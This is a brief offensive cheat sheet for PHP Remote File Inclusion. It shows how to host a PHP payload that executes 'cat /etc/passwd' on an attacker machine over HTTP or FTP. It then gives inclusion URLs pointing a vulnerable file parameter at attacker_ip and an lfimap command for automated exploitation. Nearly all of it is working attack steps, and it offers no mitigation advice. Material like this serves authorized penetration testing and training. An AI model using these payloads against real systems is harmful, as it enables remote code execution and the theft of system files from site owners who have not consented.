# Remote File Inclusion

Vulnerability in web app code that allows execution of files that are hosted on remote servers. Application can be vulnerable if 'allow_url_include' and 'allow_url_fopen' are set to 1.

### Remote inclusion via HTTP 
Setup web server with exploit.php on attacking machine, and try to include it with HTTP protocol.  
Start web server with: `python3 -m http.server 80`

Exploit.php:
```php
<?php echo system("cat /etc/passwd"); ?>
```
Include exploit file for RCE: `http://server/site.php?file=http://attacker_ip/exploit.php`  

### Remote inclusion via FTP
Setup a FTP server with exploit.php on attacking machine, and try to include it with FTP protocol.

```php
<?php echo system("cat /etc/passwd"); ?>
```
Start FTP server with: `python -m pyftpdlib -p 21`  
Include remote 'exploit.php': `http://server/site.php?file=ftp://attacker_ip/exploit.php`

### Lfimap
Remote file inclusion can be tested and exploited with [lfimap](https://github.com/hansmach1ne/lfimap).

`python3 lfimap.py -U "http://server/site.php?file=PWN" -r --no-stop --lhost <IP>`
